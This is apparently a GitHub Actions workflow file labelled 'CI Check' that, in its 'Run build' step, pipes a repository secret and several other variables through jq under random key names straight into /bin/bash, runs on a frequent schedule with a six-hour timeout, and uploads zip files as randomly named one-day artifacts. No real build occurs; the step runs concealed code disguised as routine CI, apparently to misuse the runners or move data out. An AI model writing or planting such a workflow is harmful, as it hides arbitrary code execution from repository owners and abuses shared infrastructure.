name: CI Check
on:
  workflow_dispatch:

  schedule:
    - cron: '55 1,7,13,19 * * *'
permissions:
  contents: read
concurrency:
  group: ${{ github.workflow }}
  cancel-in-progress: false
jobs:
  perform:
    name: Run build
    runs-on: ubuntu-latest
    timeout-minutes: 360
    steps:
      - uses: actions/checkout@v4
        with:
          fetch-depth: 1
      - name: Run build
        env:
          str4: ${{ secrets.str4 }}
        run: |
          printf '%s' "$str4" | jq -r .tnaxm2 | /bin/bash
          printf '%s' "$c5172" | jq -r .gd74979 | /bin/bash
          printf '%s' "$j00" | jq -r .y42372 | /bin/bash
          echo $gqgs5 | jq -r .l62022 | /bin/bash
          printf '%s' "$rs990" | jq -r .aj0 | /bin/bash
          echo $szp96 | jq -r .u2223 | /bin/bash
          echo $ph2 | jq -r .wwk1680 | /bin/bash
          echo $cy2400 | jq -r .a513 | /bin/bash

      - name: Save archive
        if: always()
        uses: actions/upload-artifact@v4
        with:
          name: cldi54Qq
          path: "*.zip"
          retention-days: 1
